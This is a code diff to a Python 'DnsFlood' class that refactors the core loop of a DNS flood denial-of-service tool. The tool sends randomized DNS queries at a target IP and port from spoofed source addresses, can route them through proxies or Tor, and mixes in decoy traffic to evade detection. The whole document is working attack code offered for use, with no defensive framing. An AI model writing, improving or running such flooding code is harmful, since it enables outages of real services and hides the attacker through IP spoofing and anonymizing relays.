@@ -78,24 +78,20 @@ class DnsFlood:
             ips = self.generate_multiple_ips(self.num_threads) if self.spoof_ip else [None] * self.num_threads
 
             def send_packets(spoofed_ip):
-                while self.is_running:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                try:
                     if spoofed_ip:
-                        try:
-                            sock.bind((spoofed_ip, 0))
-                        except socket.error as e:
-                            logging.error(Fore.RED + f"Socket bind error: {e}")
-                            continue
-                    
+                        sock.bind((spoofed_ip, 0))
+
                     packet_count = 0
                     start_time = time.time()
-                    
+
                     while self.is_running and packet_count < self.max_packets and (time.time() - start_time) < self.max_duration:
                         domain = self.get_random_domain()
                         permutations = self.generate_domain_permutations(domain)
                         for perm_domain in permutations:
                             dns_query = self.randomize_dns_payload(perm_domain)
-                            
+
                             if self.use_proxy:
                                 proxy = self.get_random_proxy()
                                 if self.check_proxy(proxy):
@@ -104,13 +100,21 @@ class DnsFlood:
                                 self.send_via_tor(dns_query)
                             else:
                                 sock.sendto(dns_query, (self.target_ip, self.target_port))
-                            
+
                             logging.debug(Fore.GREEN + f"Sent DNS query for domain: {perm_domain} from IP: {spoofed_ip if spoofed_ip else 'original'}")
                             packet_count += 1
                             time.sleep(random.uniform(*self.interval_range))
-                    
+
+                        self.send_decoy_traffic(self.target_ip, self.target_port)
+
+                except OSError as e:
+                    logging.error(Fore.RED + f"Socket bind error: {e}")
+                except socket.error as e:
+                    logging.error(Fore.RED + f"Socket error: {e}")
+                except Exception as e:
+                    logging.error(Fore.RED + f"Unexpected error: {e}")
+                finally:
                     sock.close()
-                    self.send_decoy_traffic(self.target_ip, self.target_port)
 
             with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
                 futures = [executor.submit(send_packets, ip) for ip in ips]
@@ -121,7 +125,7 @@ class DnsFlood:
             logging.error(Fore.RED + f"Socket error: {e}")
         except Exception as e:
             logging.error(Fore.RED + f"Unexpected error: {e}")
-        
+
         logging.info(f"DNS Flood attack to {self.target_ip}:{self.target_port} finished")
 
     def generate_multiple_ips(self, count):
